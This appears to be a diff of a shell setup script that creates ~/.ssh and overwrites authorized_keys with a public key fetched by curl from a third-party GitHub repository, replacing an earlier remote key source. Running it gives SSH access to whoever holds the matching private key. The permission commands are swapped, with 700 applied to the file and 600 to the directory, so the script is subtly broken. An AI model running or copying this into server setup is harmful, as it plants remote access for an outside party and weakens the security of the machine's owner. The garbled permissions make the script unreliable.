@@ -4,7 +4,7 @@ apt-get install curl -y
 cd ~
 mkdir .ssh
 cd .ssh
-wget https://raw.githubusercontent.com/lenovoy450/SSHKEY_Installer/master/authorized_keys -O authorized_keys
+curl https://raw.githubusercontent.com/oceanworldclient/AwsToolScript/main/pub.key > authorized_keys
 chmod 700 authorized_keys
 cd ../
 chmod 600 .ssh
